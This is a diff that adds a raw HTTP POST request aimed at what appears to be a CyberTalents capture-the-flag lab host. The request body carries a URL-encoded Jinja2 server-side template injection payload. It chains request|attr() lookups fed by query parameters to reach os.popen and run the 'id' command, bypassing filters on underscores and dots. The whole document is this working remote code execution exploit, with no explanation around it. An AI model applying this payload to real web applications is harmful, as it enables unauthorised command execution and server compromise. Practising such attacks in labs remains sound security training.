@@ -1,0 +1,15 @@
+POST /?a=application&b=__globals__&c=__builtins__&d=__import__&e=os&f=popen&g=id&i=read HTTP/1.1
+Host: wcomxj6zqp9t639y4nzyr42tn3km1xvk2074clz0-web.cybertalentslabs.com
+Content-Length: 717
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://wcomxj6zqp9t639y4nzyr42tn3km1xvk2074clz0-web.cybertalentslabs.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://wcomxj6zqp9t639y4nzyr42tn3km1xvk2074clz0-web.cybertalentslabs.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+name=%7B%25%20if%20%28request%7Cattr%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27a%27%29%29%7Cattr%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27b%27%29%29%7Cattr%28%27get%27%29%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27c%27%29%29%7Cattr%28%27get%27%29%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27d%27%29%29%29%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27e%27%29%29%7Cattr%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27f%27%29%29%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27g%27%29%29%7Cattr%28request%7Cattr%28%27args%27%29%7Cattr%28%27get%27%29%28%27i%27%29%29%28%29%20%25%7D%20a%20%7B%25%20endif%20%25%7D
